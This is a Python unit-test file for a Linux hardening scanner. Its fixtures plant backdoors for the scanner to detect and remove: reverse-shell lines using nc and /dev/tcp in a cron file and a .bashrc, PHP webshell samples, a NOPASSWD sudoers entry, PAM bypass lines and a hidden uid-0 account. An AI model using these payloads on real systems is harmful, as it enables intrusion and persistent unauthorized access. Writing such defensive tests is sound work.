import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'lib'))
import sentinel


class FakeCtx(sentinel.Context):
    packages = ['nmap', 'vim', 'netcat-openbsd', 'john']
    suid = ['/usr/bin/find', '/usr/bin/sudo']
    procs = [(111, '/tmp/evil'), (222, '/usr/bin/python3')]
    statuses = {'carol': 'NP', 'bob': 'P'}

    def installed_packages(self): return self.packages
    def suid_files(self): return self.suid
    def processes(self): return self.procs
    def listeners(self): return [(31337, 4242, 'nc')]
    def snaps(self): return ['john-the-ripper']
    def password_status(self, user): return self.statuses.get(user, 'P')
    def unit_running(self, unit): return unit in ('avahi-daemon', 'vsftpd', 'ssh', 'nginx')


def write(root, rel, text):
    path = Path(root) / rel.lstrip('/')
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')


class SentinelTests(unittest.TestCase):
    def setUp(self):
        guard = patch.object(sentinel, '_purge_collateral', return_value='')
        guard.start()
        self.addCleanup(guard.stop)
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / 'root'
        self.engine = Path(self.tmp.name) / 'engine'
        (self.engine / 'data').mkdir(parents=True)
        (self.engine / 'data/readme_parsed.json').write_text(json.dumps({
            'all_users': [{'name': 'alice', 'account_type': 'admin'}, {'name': 'bob', 'account_type': 'standard'}],
            'critical_services': ['ssh'], 'recent_hires': []}))
        (self.engine / 'data/auto-source.html').write_text('<p>alice:Pw (YOU)</p><p>Wireshark is NOT allowed</p>')
        write(self.root, '/etc/passwd', 'root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nbob:x:1001:1001::/home/bob:/bin/bash\n'
                                         'mallory:x:1002:1002::/home/mallory:/bin/bash\ncarol:x:1003:1003::/home/carol:/bin/bash\ntoor:x:0:0::/root:/bin/sh\n')
        write(self.root, '/etc/group', 'sudo:x:27:alice,bob\n')
        write(self.root, '/etc/hosts', '127.0.0.1 localhost\n6.6.6.6 update.microsoft.com\n')
        write(self.root, '/etc/cron.d/backdoor', '* * * * * root nc -e /bin/sh 10.0.0.1 9\n')
        write(self.root, '/etc/cron.d/e2scrub_all', '0 3 * * * root /x\n')
        write(self.root, '/etc/sudoers.d/90-evil', 'bob ALL=(ALL) NOPASSWD: ALL\n')
        write(self.root, '/home/bob/.bashrc', 'export A=1\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\nalias sudo=/tmp/x\n')
        write(self.root, '/home/bob/Downloads/hack.sh', 'echo\n')
        write(self.root, '/home/bob/Documents/notes.txt', 'ok\n')
        write(self.root, '/stray.bin', 'x')
        write(self.root, '/home/bob/.mozilla/firefox/abc.default/prefs.js', '// prefs\n')
        (self.root / 'home/alice/Desktop').mkdir(parents=True)
        with patch.dict(os.environ, {'SUDO_USER': 'alice'}):
            self.ctx = FakeCtx(self.engine, self.root)

    def by_cat(self, found):
        out = {}
        for f in found:
            out.setdefault(f.category, []).append(f)
        return out

    def test_scan_classifies_auto_and_review(self):
        cats = self.by_cat(sentinel.scan(self.ctx))
        auto = {f.action[1] for f in cats['hacking-package'] if f.mode == 'auto'}
        self.assertEqual(auto, {'nmap', 'john'})
        self.assertEqual(cats['dual-use-package'][0].mode, 'review')
        self.assertEqual(cats['suid'][0].action, ('chmod', '/usr/bin/find', 'u-s'))
        self.assertEqual(len(cats['suid']), 1)  # sudo's SUID is legitimate
        self.assertEqual(cats['sudoers'][0].mode, 'auto')
        self.assertEqual([f.mode for f in cats['backdoor-line']], ['auto', 'auto'])
        self.assertEqual(cats['empty-password'][0].action, ('lock-user', 'carol'))
        self.assertEqual(cats['backdoor-listener'][0].action, ('kill', 4242, 'nc'))
        review_texts = ' '.join(f.text for f in sentinel.scan(self.ctx) if f.mode == 'review')
        self.assertEqual([(f.mode) for f in cats['cron']], ['auto'])
        self.assertEqual([f.mode for f in cats['uid0-user']], ['auto'])
        for needle in ('mallory', '/stray.bin', 'update.microsoft.com', 'hack.sh', 'pid 111'):
            self.assertIn(needle, review_texts)
        for clean in ('notes.txt', 'e2scrub_all', 'pid 222', 'alice'):
            self.assertNotIn(clean, review_texts)

    def test_services_safe_auto_prohibited_review_critical_untouched(self):
        cats = self.by_cat(sentinel.scan(self.ctx))
        self.assertEqual([(f.action[1], f.mode) for f in cats['service-off']], [('avahi-daemon', 'auto')])
        self.assertEqual({f.action[1] for f in cats['prohibited-service']}, {'vsftpd', 'nginx'})
        self.assertEqual({f.action[1]: f.mode for f in cats['prohibited-service']}, {'vsftpd': 'auto', 'nginx': 'auto'})
        (self.engine / 'data/readme_parsed.json').write_text(json.dumps({'all_users': [], 'critical_services': ['ssh', 'nginx']}))
        again = self.by_cat(sentinel.scan(FakeCtx(self.engine, self.root)))
        self.assertEqual({f.action[1] for f in again['prohibited-service']}, {'vsftpd'})

    def test_readme_mentioned_tool_and_operator_are_protected(self):
        FakeCtx.packages = ['wireshark', 'nmap']
        self.addCleanup(setattr, FakeCtx, 'packages', ['nmap', 'vim', 'netcat-openbsd', 'john'])
        (self.engine / 'data/auto-source.html').write_text('<p>alice:Pw (YOU)</p><p>nmap is allowed</p>')
        ctx = FakeCtx(self.engine, self.root)
        pkgs = {f.action[1] for f in sentinel.scan(ctx) if f.category == 'hacking-package'}
        self.assertEqual(pkgs, {'wireshark'})
        self.assertIn('alice', ctx.protected)

    def test_apply_edits_files_with_backup_and_is_idempotent(self):
        found = {f.category + str(f.action[1:2]): f for f in sentinel.scan(self.ctx)}
        bashrc = next(f for f in sentinel.scan(self.ctx) if f.category == 'backdoor-line' and '.bashrc' in f.text)
        ok, _ = sentinel.apply(self.ctx, bashrc)
        self.assertTrue(ok)
        text = (self.root / 'home/bob/.bashrc').read_text()
        self.assertIn('# [sentinel] bash -i', text)
        self.assertIn('export A=1', text)
        self.assertTrue(list((self.engine / 'data/sentinel-backups').glob('*')))
        sudo = next(f for f in sentinel.scan(self.ctx) if f.category == 'sudoers')
        self.assertTrue(sentinel.apply(self.ctx, sudo)[0])
        self.assertIn('# [sentinel] bob ALL', (self.root / 'etc/sudoers.d/90-evil').read_text())
        rm = next(f for f in sentinel.scan(self.ctx) if f.category == 'loose-root-file')
        self.assertTrue(sentinel.apply(self.ctx, rm)[0])
        self.assertFalse((self.root / 'stray.bin').exists())
        # second pass: the fixed backdoor/sudoers lines are no longer reported
        again = {f.category for f in sentinel.scan(self.ctx)}
        self.assertNotIn('sudoers', again)
        self.assertNotIn('loose-root-file', again)

    def test_userdel_refuses_protected_and_dirs_are_not_removed(self):
        f = sentinel.Finding('x', 'x', ('userdel', 'alice'))
        self.assertFalse(sentinel.apply(self.ctx, f)[0])
        (self.root / 'somedir').mkdir()
        self.assertFalse(sentinel.apply(self.ctx, sentinel.Finding('x', 'y', ('rm', '/somedir')))[0])

    def test_review_items_alert_without_blocking_and_are_fixable_later(self):
        state, lines = {}, []
        with patch.object(sentinel, 'ask', side_effect=AssertionError('must not block')), patch.object(sentinel, 'notify'), \
                patch.object(sentinel, 'apply', return_value=(True, 'ok')):
            auto1, fresh1 = sentinel.one_pass(self.ctx, state, log=lines.append)
        self.assertGreater(fresh1, 0)
        self.assertTrue(any('ALERT' in l for l in lines))
        pending = sentinel.load_pending(self.ctx)
        self.assertTrue(pending)
        self.assertIn('mallory', (self.engine / 'data/sentinel-review.txt').read_text())
        with patch.object(sentinel, 'ask', side_effect=AssertionError('asked')), patch.object(sentinel, 'notify') as popup, \
                patch.object(sentinel, 'apply', return_value=(True, 'ok')):
            auto2, fresh2 = sentinel.one_pass(self.ctx, state, log=lines.append)
        self.assertEqual((auto2, fresh2), (0, 0))
        popup.assert_not_called()  # no repeat popups for the same items
        first = pending[0]
        with patch.object(sentinel, 'apply', return_value=(True, 'ok')) as fix:
            sentinel.save_state(self.ctx, state)
            self.assertEqual(sentinel.run_fix(self.ctx, '1', log=lines.append), 1)
        self.assertEqual(fix.call_args[0][1].text, first['text'])
        self.assertEqual(len(sentinel.load_pending(self.ctx)), len(pending) - 1)
        self.assertEqual(sentinel.run_fix(self.ctx, 'all', dismiss=True, log=lines.append), len(pending) - 1)
        self.assertEqual(sentinel.load_pending(self.ctx), [])

    def test_firefox_profile_hardened_once_and_desktop_report_written(self):
        state, lines = {}, []
        with patch.object(sentinel, 'notify'):
            sentinel.one_pass(self.ctx, state, log=lines.append)
            sentinel.one_pass(self.ctx, state, log=lines.append)
        userjs = (self.root / 'home/bob/.mozilla/firefox/abc.default/user.js').read_text()
        self.assertIn('dom.disable_open_during_load', userjs)
        self.assertEqual(userjs.count('signon.rememberSignons'), 1)  # idempotent
        report = (self.root / 'home/alice/Desktop/SENTINEL-ALERTS.md').read_text()
        self.assertIn('## Needs your eyes', report)
        self.assertIn('mallory', report)
        self.assertIn('## Fixed automatically', report)
        self.assertIn('firefox:', report)

    def test_failed_purge_reports_apt_error_and_stops_after_three_tries(self):
        class R:
            returncode, stdout, stderr = 100, '', 'E: Could not get lock /var/lib/dpkg/lock'
        state, lines = {}, []
        with patch.object(sentinel, 'run', return_value=R()) as apt, patch.object(sentinel, 'notify'):
            for _ in range(5):
                sentinel.one_pass(self.ctx, state, log=lines.append)
        self.assertTrue(any('Could not get lock' in l for l in lines))
        self.assertEqual(sum(1 for c in apt.call_args_list if 'nmap' in c[0][0]), 3)  # gives up after 3 failures

    def test_host_conf_nospoof_removed_automatically(self):
        write(self.root, '/etc/host.conf', 'order hosts,bind\nmulti on\nnospoof on\n')
        found = [f for f in sentinel.scan(self.ctx) if f.category == 'host-conf']
        self.assertEqual(len(found), 1)
        self.assertEqual(found[0].mode, 'auto')
        self.assertTrue(sentinel.apply(self.ctx, found[0])[0])
        self.assertEqual((self.root / 'etc/host.conf').read_text(), 'order hosts,bind\nmulti on\n')

    def test_ask_mode_still_available(self):
        state = {}
        with patch.object(sentinel, 'ask', return_value='\n') as prompt, patch.object(sentinel, 'apply', return_value=(True, 'ok')):
            sentinel.one_pass(self.ctx, state, ask_mode=True, log=lambda *_: None)
        prompt.assert_called_once()

    def test_parse_picks(self):
        self.assertEqual(sentinel.parse_picks('1,3', 5), [0, 2])
        self.assertEqual(sentinel.parse_picks('2-4', 5), [1, 2, 3])
        self.assertEqual(sentinel.parse_picks('all', 3), [0, 1, 2])
        self.assertEqual(sentinel.parse_picks('', 3), [])
        self.assertEqual(sentinel.parse_picks('9, x', 3), [])


if __name__ == '__main__':
    unittest.main()


class AliasTests(unittest.TestCase):
    def test_benign_aliases_ignored_and_hijacks_flagged(self):
        self.assertFalse(sentinel.alias_hijacked("alias ls='ls --color=auto'"))
        self.assertFalse(sentinel.alias_hijacked('alias ll="ls -alF"'))
        self.assertTrue(sentinel.alias_hijacked('alias sudo="/tmp/evil"'))
        self.assertTrue(sentinel.alias_hijacked("alias cat='nc 1.2.3.4 9 <'"))
        self.assertTrue(sentinel.alias_hijacked('alias ls=""'))


class ForceRemoveTests(unittest.TestCase):
    def test_second_uid0_account_is_removed_from_all_files(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, '/etc/passwd', 'root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/home/toor:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n')
            write(d, '/etc/shadow', 'root:!:1:::::\ntoor:!:1:::::\nbob:!:1:::::\n')
            write(d, '/etc/group', 'sudo:x:27:bob,toor\nadm:x:4:toor\n')
            write(d, '/etc/gshadow', 'sudo:!::bob,toor\n')
            write(d, '/home/toor/x', 'x')
            ctx = sentinel.Context(d, root=d)
            ok, _ = sentinel._force_remove_user(ctx, 'toor')
            self.assertTrue(ok)
            self.assertNotIn('toor', (Path(d) / 'etc/passwd').read_text())
            self.assertNotIn('toor', (Path(d) / 'etc/shadow').read_text())
            self.assertEqual((Path(d) / 'etc/group').read_text(), 'sudo:x:27:bob\nadm:x:4:\n')
            self.assertFalse((Path(d) / 'home/toor').exists())


class WebshellTests(unittest.TestCase):
    def test_shell_patterns(self):
        self.assertTrue(sentinel.WEBSHELL_RE.search('<?php system($_GET["c"]); ?>'))
        self.assertTrue(sentinel.WEBSHELL_RE.search('<?php eval(base64_decode($x)); ?>'))
        self.assertTrue(sentinel.WEBSHELL_RE.search('<?php @$_POST["a"]($_POST["b"]); ?>'))
        self.assertFalse(sentinel.WEBSHELL_RE.search('<?php echo htmlspecialchars($_GET["q"]); ?>'))


class PrivilegeTests(SentinelTests):
    def test_root_equivalent_groups_sudo_grants_and_snaps(self):
        write(self.root, '/etc/group', 'sudo:x:27:alice,bob\ndocker:x:998:alice,carol\n')
        write(self.root, '/etc/sudoers.d/91-carol', 'carol ALL=(ALL:ALL) ALL\n%ops ALL=(ALL) ALL\nalice ALL=(ALL) ALL\n')
        cats = self.by_cat(sentinel.scan(self.ctx))
        self.assertEqual([f.action for f in cats['privileged-group']], [('gpasswd-del', 'carol', 'docker')])  # operator alice kept
        grants = {f.text.split(': ', 1)[1] for f in cats['sudoers-grant']}
        self.assertTrue(any('carol ALL' in g for g in grants) and any('%ops' in g for g in grants))
        self.assertFalse(any('alice ALL' in g for g in grants))
        self.assertEqual(cats['hacking-snap'][0].action, ('snap-remove', 'john-the-ripper'))


class PamAndSshTests(SentinelTests):
    def test_pam_backdoors_and_ssh_when_readme_silent(self):
        write(self.root, '/etc/pam.d/sudo', 'auth sufficient pam_permit.so\n@include common-auth\n')
        write(self.root, '/etc/pam.d/su', 'auth sufficient pam_rootok.so\nauth sufficient pam_wheel.so trust\n')
        write(self.root, '/etc/pam.d/common-auth', 'auth\t[success=1 default=ignore]\tpam_unix.so nullok\nauth\trequisite\tpam_deny.so\nauth\trequired\tpam_permit.so\n')
        write(self.root, '/etc/pam.d/login', 'auth sufficient pam_succeed_if.so user = eve\n')
        (self.engine / 'data/readme_parsed.json').write_text(json.dumps({'all_users': [{'name': 'alice', 'account_type': 'admin'}], 'critical_services': ['apache2'], 'recent_hires': []}))
        (self.engine / 'data/auto-source.html').write_text('<p>alice:Pw (YOU)</p>' + '<p>Company web server notes. </p>' * 12)
        ctx = FakeCtx(self.engine, self.root)
        cats = self.by_cat(sentinel.scan(ctx))
        self.assertEqual(sorted(f.text.split(': ', 1)[1] for f in cats['pam-backdoor']),
                         ['auth sufficient pam_permit.so', 'auth sufficient pam_wheel.so trust'])
        self.assertTrue(all(f.mode == 'auto' for f in cats['pam-backdoor']))
        self.assertEqual([f.mode for f in cats['pam-suspect']], ['review'])
        self.assertEqual(cats['ssh-not-needed'][0].action, ('disable-unit', 'ssh'))
        (self.engine / 'data/readme_parsed.json').write_text(json.dumps({'all_users': [], 'critical_services': ['ssh'], 'recent_hires': []}))
        (self.engine / 'data/auto-source.html').write_text('<p>alice:Pw (YOU)</p><p>SSH is a critical service</p>' + '<p>x</p>' * 80)
        again = self.by_cat(sentinel.scan(FakeCtx(self.engine, self.root)))
        self.assertNotIn('ssh-not-needed', again)


class PurgeGuardTests(unittest.TestCase):
    def fake(self, remv):
        out = ''.join(f'Remv {p} [1.0]\n' for p in remv)
        return patch.object(sentinel.subprocess, 'run', return_value=type('R', (), {'stdout': out, 'stderr': '', 'returncode': 0})())

    def test_blocks_desktop_collateral_and_mass_removals(self):
        with self.fake(['gnome-games', 'ubuntu-desktop', 'mint-meta-cinnamon']):
            self.assertIn('ubuntu-desktop', sentinel._purge_collateral('gnome-games'))
        with self.fake(['john'] + [f'lib{i}' for i in range(30)]):
            self.assertIn('packages', sentinel._purge_collateral('john'))
        with self.fake(['john', 'john-data']):
            self.assertEqual(sentinel._purge_collateral('john'), '')
